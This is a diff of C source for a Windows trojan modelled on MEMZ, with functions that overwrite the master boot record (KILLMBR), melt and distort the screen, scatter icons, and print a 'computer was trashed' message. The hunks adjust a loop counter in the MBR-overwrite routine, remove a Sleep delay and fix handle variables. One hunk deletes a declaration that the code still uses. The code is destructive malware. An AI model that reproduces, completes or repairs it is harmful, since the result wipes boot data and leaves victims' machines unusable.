@@ -430,7 +430,6 @@ void infCursor(){
 void RandIcon(){
     int cx = GetSystemMetrics(SM_CXFULLSCREEN);
     int cy = GetSystemMetrics(SM_CYFULLSCREEN);
-    HWND hwnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hwnd);
     DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_QUESTION));
     DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WARNING));
@@ -454,7 +453,7 @@ void KILLMBR(){
     unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
 
     // Join the two code parts together
-    int i = 0;
+    long long unsigned int i = 0;
     for (; i < code1_len; i++)
         *(bootcode + i) = *(code1 + i);
     for (i = 0; i < code2_len; i++)
@@ -603,7 +602,7 @@ void ScreenMelter(){
     srand((unsigned) time(&t));
     
     HDC screenDC = GetDC(NULL);
-    HDC hdc = CreateCompatibleDC(screenDC);
+
     int scrWidth = GetDeviceCaps(screenDC, HORZRES);
     int scrHeight = GetDeviceCaps(screenDC, VERTRES);
     
@@ -612,7 +611,7 @@ void ScreenMelter(){
         HDC screenDC = GetDC(NULL);
         x = rand() % scrWidth;
         BitBlt(screenDC, x, 1, 10, scrHeight, screenDC, x, 0, SRCCOPY);
-        Sleep(2);
+        //Sleep(2);
     }
 }
 void Shake(){
@@ -655,8 +654,7 @@ void iconAura(){
     HWND hwnd = GetDesktopWindow();
     HDC hdc = GetWindowDC(hwnd);
          //寄存器//
-    HWND hWnd;
-    SendMessage(hWnd, WM_SETREDRAW, FALSE, 0L);
+    SendMessage(hwnd, WM_SETREDRAW, FALSE, 0L);
     
     while(true)
     {
@@ -731,7 +729,6 @@ void infglitch(){
 }
 void sayNyan(){ // Decompile By NyanConsole! (I Think This Code Need Optimize...)
     HANDLE StdHandle; // eax
-    HANDLE h[12]; // [esp+5Ch] [ebp-6Ch]
     int count; // [esp+A0h] [ebp-28h]s
     LPCSTR lpString; // [esp+A4h] [ebp-24h]
     lpString = "Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...";
